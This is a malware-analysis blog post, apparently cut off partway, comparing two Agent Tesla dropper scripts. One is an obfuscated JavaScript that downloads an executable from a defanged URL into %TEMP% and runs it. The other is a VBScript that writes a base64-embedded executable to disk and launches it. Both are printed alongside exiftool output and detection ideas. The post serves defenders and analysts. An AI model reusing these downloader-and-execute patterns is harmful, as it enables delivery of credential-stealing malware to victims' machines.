<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="A Tale of Two Dropper Scripts for Agent Tesla" /><meta property="og:locale" content="en" /><meta name="description" content="In this post I want to look at two script files that drop Agent Tesla stealers on affected systems and show how adversary decisions affect malware analysis and detection. If you want to follow along at home, I’m working with these samples from MalwareBazaar:" /><meta property="og:description" content="In this post I want to look at two script files that drop Agent Tesla stealers on affected systems and show how adversary decisions affect malware analysis and detection. If you want to follow along at home, I’m working with these samples from MalwareBazaar:" /><link rel="canonical" href="https://forensicitguy.github.io/a-tale-of-two-dropper-scripts/" /><meta property="og:url" content="https://forensicitguy.github.io/a-tale-of-two-dropper-scripts/" /><meta property="og:site_name" content="Tony Lambert" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-03T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="A Tale of Two Dropper Scripts for Agent Tesla" /><meta name="twitter:site" content="@ForensicITGuy" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-28T23:09:20+00:00","datePublished":"2022-01-03T00:00:00+00:00","description":"In this post I want to look at two script files that drop Agent Tesla stealers on affected systems and show how adversary decisions affect malware analysis and detection. If you want to follow along at home, I’m working with these samples from MalwareBazaar:","headline":"A Tale of Two Dropper Scripts for Agent Tesla","mainEntityOfPage":{"@type":"WebPage","@id":"https://forensicitguy.github.io/a-tale-of-two-dropper-scripts/"},"url":"https://forensicitguy.github.io/a-tale-of-two-dropper-scripts/"}</script><title>A Tale of Two Dropper Scripts for Agent Tesla | Tony Lambert</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tony Lambert"><meta name="application-name" content="Tony Lambert"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/images/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Tony Lambert</a></div><div class="site-subtitle font-italic">An educator that does security things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ForensicITGuy" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ForensicITGuy" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://ko-fi.com/forensicitguy" aria-label="ko-fi" target="_blank" rel="noopener"> <i class="fas fa-mug-hot"></i> </a> <a href="https://infosec.exchange/web/@ForensicITGuy" aria-label="mastodon" target="_blank" rel="noopener"> <i class="fab fa-mastodon"></i> </a> <a href="https://www.linkedin.com/in/tonymlambert/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>A Tale of Two Dropper Scripts for Agent Tesla</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>A Tale of Two Dropper Scripts for Agent Tesla</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1641168000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-01-03 </em> </span> <span> Updated <em class="timeago" data-ts="1648508960" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-03-28 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1169 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><p>In this post I want to look at two script files that drop Agent Tesla stealers on affected systems and show how adversary decisions affect malware analysis and detection. If you want to follow along at home, I’m working with these samples from MalwareBazaar:</p><ul><li><a href="https://bazaar.abuse.ch/sample/46dd53f3096877a4cad89b77f2d23018d8bc5887a9c0d699cb43ffe9d0b5e29d/">https://bazaar.abuse.ch/sample/46dd53f3096877a4cad89b77f2d23018d8bc5887a9c0d699cb43ffe9d0b5e29d/</a><li><a href="https://bazaar.abuse.ch/sample/ac0517947c0be7baad44fb8f054215c00ada03bb61772bab9eb52e48a9c3a097/">https://bazaar.abuse.ch/sample/ac0517947c0be7baad44fb8f054215c00ada03bb61772bab9eb52e48a9c3a097/</a></ul><p>The first script (hash starting with <code class="language-plaintext highlighter-rouge">46dd</code>) is crafted with love using obfuscated JavaScript and shows how an adversary made the decision to download subsequent stages rather than embed into the script. The second script (hash starting with <code class="language-plaintext highlighter-rouge">ac05</code>) is crafted with care using VBscript and shows another adversary choosing to embed a second stage into the script rather than trying to download more content.</p><h2 id="adversary-path---downloading-stages"><span class="mr-2">Adversary Path - Downloading Stages</span><a href="#adversary-path---downloading-stages" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>In the downloading path, we can see that the script is fairly obfuscated, but brief:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">_0x181193</span><span class="o">=</span><span class="nx">_0x2d0f</span><span class="p">;(</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x2af778</span><span class="p">,</span><span class="nx">_0x402c31</span><span class="p">){</span><span class="kd">var</span> <span class="nx">_0x2500ec</span><span class="o">=</span><span class="nx">_0x2d0f</span><span class="p">,</span><span class="nx">_0x1384b3</span><span class="o">=</span><span class="nx">_0x2af778</span><span class="p">();</span><span class="k">while</span><span class="p">(</span><span class="o">!!</span><span class="p">[]){</span><span class="k">try</span><span class="p">{</span><span class="kd">var</span> <span class="nx">_0x1e4494</span><span class="o">=-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x2500ec</span><span class="p">(</span><span class="mh">0x1de</span><span class="p">))</span><span class="o">/</span><span class="mh">0x1</span><span class="o">+</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x2500ec</span><span class="p">(</span><span class="mh">0x1d1</span><span class="p">))</span><span class="o">/</span><span class="mh">0x2</span><span class="o">+-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x2500ec</span><span class="p">(</span><span class="mh">0x1d5</span><span class="p">))</span><span class="o">/</span><span class="mh">0x3</span><span class="o">+</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x2500ec</span><span class="p">(</span><span class="mh">0x1e0</span><span class="p">))</span><span class="o">/</span><span class="mh">0x4</span><span class="o">*</span><span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x2500ec</span><span class="p">(</span><span class="mh">0x1db</span><span class="p">))</span><span class="o">/</span><span class="mh">0x5</span><span class="p">)</span><span class="o">+</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x2500ec</span><span class="p">(</span><span class="mh">0x1cd</span><span class="p">))</span><span class="o">/</span><span class="mh">0x6</span><span class="o">+-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x2500ec</span><span class="p">(</span><span class="mh">0x1c8</span><span class="p">))</span><span class="o">/</span><span class="mh">0x7</span><span class="o">*</span><span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x2500ec</span><span class="p">(</span><span class="mh">0x1df</span><span class="p">))</span><span class="o">/</span><span class="mh">0x8</span><span class="p">)</span><span class="o">+</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x2500ec</span><span class="p">(</span><span class="mh">0x1d2</span><span class="p">))</span><span class="o">/</span><span class="mh">0x9</span><span class="o">*</span><span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x2500ec</span><span class="p">(</span><span class="mh">0x1d0</span><span class="p">))</span><span class="o">/</span><span class="mh">0xa</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="nx">_0x1e4494</span><span class="o">===</span><span class="nx">_0x402c31</span><span class="p">)</span><span class="k">break</span><span class="p">;</span><span class="k">else</span> <span class="nx">_0x1384b3</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x1384b3</span><span class="p">[</span><span class="dl">'</span><span class="s1">shift</span><span class="dl">'</span><span class="p">]());}</span><span class="k">catch</span><span class="p">(</span><span class="nx">_0x9770c4</span><span class="p">){</span><span class="nx">_0x1384b3</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x1384b3</span><span class="p">[</span><span class="dl">'</span><span class="s1">shift</span><span class="dl">'</span><span class="p">]());}}}(</span><span class="nx">_0x4335</span><span class="p">,</span><span class="mh">0x3a8ff</span><span class="p">));</span><span class="kd">var</span> <span class="nx">WshShell</span><span class="o">=</span><span class="nx">WScript</span><span class="p">[</span><span class="nx">_0x181193</span><span class="p">(</span><span class="mh">0x1d8</span><span class="p">)](</span><span class="nx">_0x181193</span><span class="p">(</span><span class="mh">0x1d3</span><span class="p">)),</span><span class="nx">filepath</span><span class="o">=</span><span class="nx">WshShell</span><span class="p">[</span><span class="nx">_0x181193</span><span class="p">(</span><span class="mh">0x1dd</span><span class="p">)](</span><span class="dl">'</span><span class="s1">%TEMP%</span><span class="dl">'</span><span class="p">)</span><span class="o">+</span><span class="dl">'</span><span class="s1">/rt.exe</span><span class="dl">'</span><span class="p">,</span><span class="nx">url</span><span class="o">=</span><span class="nx">_0x181193</span><span class="p">(</span><span class="mh">0x1cf</span><span class="p">),</span><span class="nx">xhr</span><span class="o">=</span><span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="nx">_0x181193</span><span class="p">(</span><span class="mh">0x1ce</span><span class="p">));</span><span class="nx">xhr</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x181193</span><span class="p">(</span><span class="mh">0x1d6</span><span class="p">),</span><span class="nx">url</span><span class="p">,</span><span class="o">!</span><span class="p">[]),</span><span class="nx">xhr</span><span class="p">[</span><span class="nx">_0x181193</span><span class="p">(</span><span class="mh">0x1da</span><span class="p">)]();</span><span class="kd">function</span> <span class="nx">_0x4335</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">_0x9dcd91</span><span class="o">=</span><span class="p">[</span><span class="dl">'</span><span class="s1">2406210dsHjnj</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">693904PWufDQ</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">9vwQAXw</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">WScript.Shell</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Write</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">237552VRkBbi</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">ADODB.Stream</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">CreateObject</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">ResponseBody</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">send</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">345JNNSha</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Open</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">ExpandEnvironmentStrings</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">254303yqzRYw</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">2192RvXUxf</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">19476TscEAp</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">9646fwwenO</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">SaveToFile</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Close</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Type</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Scripting.FileSystemObject</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">164376qLrHmK</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">MSXML2.XMLHTTP</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">hxxp://mudanzasdistintas[.]com.ar/vvt/td.exe</span><span class="dl">'</span><span class="p">];</span><span class="nx">_0x4335</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span><span class="k">return</span> <span class="nx">_0x9dcd91</span><span class="p">;};</span><span class="k">return</span> <span class="nx">_0x4335</span><span class="p">();}</span><span class="kd">var</span> <span class="nx">fso</span><span class="o">=</span><span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="nx">_0x181193</span><span class="p">(</span><span class="mh">0x1cc</span><span class="p">));</span><span class="k">if</span><span class="p">(</span><span class="nx">fso</span><span class="p">[</span><span class="dl">'</span><span class="s1">FileExists</span><span class="dl">'</span><span class="p">](</span><span class="nx">filepath</span><span class="p">)</span><span class="o">==!</span><span class="p">[]){</span><span class="kd">var</span> <span class="nx">stream</span><span class="o">=</span><span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="nx">_0x181193</span><span class="p">(</span><span class="mh">0x1d7</span><span class="p">));</span><span class="nx">stream</span><span class="p">[</span><span class="nx">_0x181193</span><span class="p">(</span><span class="mh">0x1dc</span><span class="p">)](),</span><span class="nx">stream</span><span class="p">[</span><span class="nx">_0x181193</span><span class="p">(</span><span class="mh">0x1cb</span><span class="p">)]</span><span class="o">=</span><span class="mh">0x1</span><span class="p">,</span><span class="nx">stream</span><span class="p">[</span><span class="nx">_0x181193</span><span class="p">(</span><span class="mh">0x1d4</span><span class="p">)](</span><span class="nx">xhr</span><span class="p">[</span><span class="nx">_0x181193</span><span class="p">(</span><span class="mh">0x1d9</span><span class="p">)]),</span><span class="nx">stream</span><span class="p">[</span><span class="dl">'</span><span class="s1">Position</span><span class="dl">'</span><span class="p">]</span><span class="o">=</span><span class="mh">0x0</span><span class="p">,</span><span class="nx">stream</span><span class="p">[</span><span class="nx">_0x181193</span><span class="p">(</span><span class="mh">0x1c9</span><span class="p">)](</span><span class="nx">filepath</span><span class="p">,</span><span class="mh">0x2</span><span class="p">),</span><span class="nx">stream</span><span class="p">[</span><span class="nx">_0x181193</span><span class="p">(</span><span class="mh">0x1ca</span><span class="p">)]();}</span><span class="kd">function</span> <span class="nx">_0x2d0f</span><span class="p">(</span><span class="nx">_0x27e577</span><span class="p">,</span><span class="nx">_0x37192f</span><span class="p">){</span><span class="kd">var</span> <span class="nx">_0x43355c</span><span class="o">=</span><span class="nx">_0x4335</span><span class="p">();</span><span class="k">return</span> <span class="nx">_0x2d0f</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x2d0ffa</span><span class="p">,</span><span class="nx">_0x4a32bc</span><span class="p">){</span><span class="nx">_0x2d0ffa</span><span class="o">=</span><span class="nx">_0x2d0ffa</span><span class="o">-</span><span class="mh">0x1c8</span><span class="p">;</span><span class="kd">var</span> <span class="nx">_0x35edeb</span><span class="o">=</span><span class="nx">_0x43355c</span><span class="p">[</span><span class="nx">_0x2d0ffa</span><span class="p">];</span><span class="k">return</span> <span class="nx">_0x35edeb</span><span class="p">;},</span><span class="nx">_0x2d0f</span><span class="p">(</span><span class="nx">_0x27e577</span><span class="p">,</span><span class="nx">_0x37192f</span><span class="p">);}</span><span class="kd">var</span> <span class="nx">shell</span><span class="o">=</span><span class="nx">WScript</span><span class="p">[</span><span class="nx">_0x181193</span><span class="p">(</span><span class="mh">0x1d8</span><span class="p">)](</span><span class="dl">'</span><span class="s1">WScript.Shell</span><span class="dl">'</span><span class="p">);</span><span class="nx">shell</span><span class="p">[</span><span class="dl">'</span><span class="s1">Run</span><span class="dl">'</span><span class="p">](</span><span class="nx">filepath</span><span class="p">);</span>
</pre></table></code></div></div><p>We could potentially make this code prettier using a NodeJS REPL but the adversary chose to leave most of the essential stuff in plaintext for us. The strings <code class="language-plaintext highlighter-rouge">MSXML2.XMLHTTP</code> and <code class="language-plaintext highlighter-rouge">hxxp://mudanzasdistintas[.]com.ar/vvt/td.exe</code> indicate a second stage likely comes from a downloaded executable. The string <code class="language-plaintext highlighter-rouge">shell['Run']</code> indicates the script likely launches that second stage at th end. While the script is relatively short, the majority of the script contents focus on obfuscation while not actually performing effective obfuscation. Since the adversary chose this route, we can make a few hypotheses:</p><ul><li>The script is likely smaller<li>The script contains less details about subsequent stages<li>A wscript or cscript process will spawn the downloaded content<li>A wscript or cscript process will establish a network connection</ul><p>We can test out these hypotheses using a combination of static analysis and a sandbox report. For file size, we can look at properties using <code class="language-plaintext highlighter-rouge">exiftool</code> or filesystem tools like <code class="language-plaintext highlighter-rouge">ls</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>remnux@remnux:~/cases/js-tesla$ exiftool documentos.js 
ExifTool Version Number         : 12.30
File Name                       : documentos.js
Directory                       : .
File Size                       : 1917 bytes
File Modification Date/Time     : 2022:01:03 17:33:52-05:00
File Access Date/Time           : 2022:01:03 17:11:34-05:00
File Inode Change Date/Time     : 2022:01:03 12:36:18-05:00
File Permissions                : -rw-r--r--
File Type                       : TXT
File Type Extension             : txt
MIME Type                       : text/plain
MIME Encoding                   : us-ascii
Newlines                        : (none)
Line Count                      : 1
Word Count                      : 21
</pre></table></code></div></div><p>This script weighs in at 1917 bytes, fairly small. From the <a href="https://tria.ge/220103-rt6ahahhal">Tria.ge sandbox report</a>, we can also confirm <code class="language-plaintext highlighter-rouge">wscript.exe</code> makes a network connection and at least one file modification to write the executable.</p><p><img data-src="/assets/images/a-tale-of-two-dropper-scripts/triage-report.png" alt="Tria.ge report processes" data-proofer-ignore></p><p><img data-src="/assets/images/a-tale-of-two-dropper-scripts/triage-filemod.png" alt="Tria.ge report file modification" data-proofer-ignore></p><p>If we’re looking for detection ideas, we could look into analytics that involve <code class="language-plaintext highlighter-rouge">wscript.exe</code> making network connections as well as file modifications.</p><h2 id="adversary-path---embedding-stages"><span class="mr-2">Adversary Path - Embedding Stages</span><a href="#adversary-path---embedding-stages" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>In the sample that embeds a payload, we can first see that the script contains a lot of content.</p><div class="language-vb highlighter-rouge"><div class="code-header"> <span data-label-text="Visual Basic"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="n">on</span> <span class="n">error</span> <span class="n">resume</span> <span class="n">next</span>
<span class="n">dim</span> <span class="n">medo</span><span class="p">,</span><span class="n">sea</span><span class="p">,</span><span class="n">medoff</span>
<span class="n">dim</span> <span class="n">maasr</span>
<span class="n">set</span> <span class="n">helper</span> <span class="o">=</span> <span class="n">createobject</span><span class="p">(</span><span class="s">"Wscript.Shell"</span><span class="p">)</span>
<span class="n">maasr</span> <span class="o">=</span> <span class="n">helper</span><span class="p">.</span><span class="n">ExpandEnvironmentStrings</span><span class="p">(</span><span class="s">"%temp%"</span><span class="p">)</span>
<span class="n">set</span> <span class="n">medo</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Msxml2.DOMDocument.3.0"</span><span class="p">).</span><span class="n">CreateElement</span><span class="p">(</span><span class="s">"base64"</span><span class="p">)</span>
<span class="n">medo</span><span class="p">.</span><span class="n">dataType</span><span class="o">=</span><span class="s">"bin.base64"</span>
<span class="n">medo</span><span class="p">.</span><span class="n">text</span><span class="o">=</span><span class="s">"TVqQAAMAAAAEAAAA//

...

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
<span class="n">set</span> <span class="n">sea</span><span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"ADODB.Stream"</span><span class="p">)</span>
<span class="n">sea</span><span class="p">.</span><span class="n">Type</span><span class="o">=</span><span class="mi">1</span>
<span class="n">sea</span><span class="p">.</span><span class="n">Open</span>
<span class="n">sea</span><span class="p">.</span><span class="n">Write</span> <span class="n">medo</span><span class="p">.</span><span class="n">nodeTypedValue</span>
<span class="n">sea</span><span class="p">.</span><span class="n">SavetoFile</span> <span class="n">maasr</span> <span class="o">&amp;</span> <span class="s">"\anyname.exe"</span><span class="p">,</span><span class="mi">2</span>
<span class="n">helper</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">maasr</span> <span class="o">&amp;</span> <span class="s">"\anyname.exe"</span><span class="p">)</span>
<span class="k">Function</span> <span class="nf">tttttttttttttttt</span> <span class="p">()</span>
<span class="n">tttttttttttttttt</span> <span class="o">=</span> <span class="n">chr</span><span class="p">(</span><span class="mi">104</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">chr</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">chr</span><span class="p">(</span><span class="mi">114</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">chr</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span>
<span class="k">End</span> <span class="n">function</span>
</pre></table></code></div></div><p>I’ve included the first and last parts of the script for brevity, but the <code class="language-plaintext highlighter-rouge">exiftool</code> output shows a significantly larger size:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>remnux@remnux:~/cases/tesla$ exiftool TGFTR.vbs 
ExifTool Version Number         : 12.30
File Name                       : TGFTR.vbs
Directory                       : .
File Size                       : 935 KiB
File Modification Date/Time     : 2022:01:02 21:40:36-05:00
File Access Date/Time           : 2022:01:03 17:27:22-05:00
File Inode Change Date/Time     : 2022:01:02 16:42:17-05:00
File Permissions                : -rw-r--r--
File Type                       : TXT
